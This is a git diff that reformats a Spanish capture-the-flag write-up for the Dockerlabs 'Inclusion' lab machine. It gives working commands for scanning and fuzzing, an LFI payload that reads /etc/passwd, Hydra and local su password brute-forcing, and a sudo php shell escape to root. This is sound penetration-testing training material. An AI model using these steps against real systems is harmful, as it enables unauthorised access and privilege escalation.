@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Inclusion 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Inclusion ​​
 
-> **Tags:** `Linux` `Web` `PHP` `Gobuster` `Wfuzz` `LFI` `Hydra` `SCP` `Sudoers` 
+## 🖥️ Writeup - Inclusion
 
-# INSTALACIÓN
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
+
+> **Tags:** `Linux` `Web` `PHP` `Gobuster` `Wfuzz` `LFI` `Hydra` `SCP` `Sudoers`
+
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip inclusion.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh inclusion.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 19:44 CET
 Nmap scan report for 172.17.0.2
@@ -82,7 +91,7 @@ Identificamos los puertos `22` y `80` abiertos.
 
 Accedemos al servicio web del puerto `80` y nos encontramos con la página por defecto de `Apache`.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -91,6 +100,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/d
 ```
 
 Info:
+
 ```
 gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60 
 ===============================================================
@@ -115,7 +125,7 @@ Progress: 1038852 / 1543899 (67.29%)
 
 Descubrimos el directorio `/shop`. Entramos y vemos la siguiente página:
 
-![alt text](../../images/shop.png)
+![alt text](../../.gitbook/assets/shop.png)
 
 En la parte inferior de la pantalla observamos un mensaje de error:
 
@@ -134,6 +144,7 @@ gobuster dir -u http://172.17.0.2/shop -w /usr/share/seclists/Discovery/Web-Cont
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -156,7 +167,7 @@ Progress: 20757 / 1543906 (1.34%)
 
 Este es el archivo que probablemente sea vulnerable a `LFI`, `index.php`.
 
-# LFI
+## LFI
 
 Procedemos a `fuzzear` para encontrar el `parámetro` que el script utiliza para llamar al archivo.
 
@@ -165,6 +176,7 @@ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-
 ```
 
 Info:
+
 ```
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -188,13 +200,13 @@ Comprobamos la vulnerabilidad intentando visualizar `/etc/passwd` mediante este 
 http://172.17.0.2/shop/index.php?archivo=../../../../etc/passwd
 ```
 
-![alt text](../../images/lfipasswd.png)
+![alt text](../../.gitbook/assets/lfipasswd.png)
 
 Tenemos éxito y logramos leer el contenido, donde identificamos dos usuarios del sistema: `manchi` y `seller`.
 
 Guardamos estos usuarios en un archivo `users.txt`.
 
-# HYDRA
+## HYDRA
 
 Intentamos obtener credenciales para alguno de los usuarios mediante un ataque de `fuerza bruta` con `Hydra`.
 
@@ -203,6 +215,7 @@ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 50
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -222,7 +235,7 @@ Accedemos por `SSH`.
 ssh manchi@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Tras una enumeración exhaustiva del sistema (permisos sudo, SUID, capabilities, variables de entorno, kernel e incluso pasando LinPEAS), localizamos la pista clave en el archivo `/etc/ssh/sshd_config`.
 
@@ -236,7 +249,7 @@ Esto indica que `manchi`, el usuario con el que operamos actualmente, es el úni
 
 Este hallazgo nos lleva a intentar un ataque de `fuerza bruta` contra el usuario `seller`, pero esta vez de manera local desde la sesión de `manchi`.
 
-Para ello utilizamos el repositorio de `GitHub` Maalfer/Sudo_BruteForce, concretamente el script de bash `Linux-Su-Force.sh`.
+Para ello utilizamos el repositorio de `GitHub` Maalfer/Sudo\_BruteForce, concretamente el script de bash `Linux-Su-Force.sh`.
 
 Una vez descargado en nuestra máquina atacante, debemos transferirlo junto con el diccionario a la máquina víctima. Dado que en la máquina víctima no disponemos de `wget` ni `curl`, utilizamos `scp` para la transferencia.
 
@@ -249,7 +262,7 @@ manchi@172.17.0.2's password:
 Linux-Su-Force.sh                                        100% 1600   697.5KB/s   00:00
 ```
 
-----------------------------------------------------------------------------------------------------------------------------------------
+***
 
 ```bash
 scp /usr/share/wordlists/rockyou.txt manchi@172.17.0.2:/tmp/rockyou.txt
@@ -276,6 +289,7 @@ drwxr-xr-x 1 root   root        4096 Nov 30 18:43 ..
 ```
 
 Info:
+
 ```
 Contraseña encontrada para el usuario seller: qwerty
 ```
@@ -295,6 +309,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for seller on a894d81c1614:
     env_reset, mail_badpass,
@@ -311,6 +326,7 @@ sudo php -r "system('/bin/bash');"
 ```
 
 Info:
+
 ```
 root@a894d81c1614:/tmp# whoami
 root
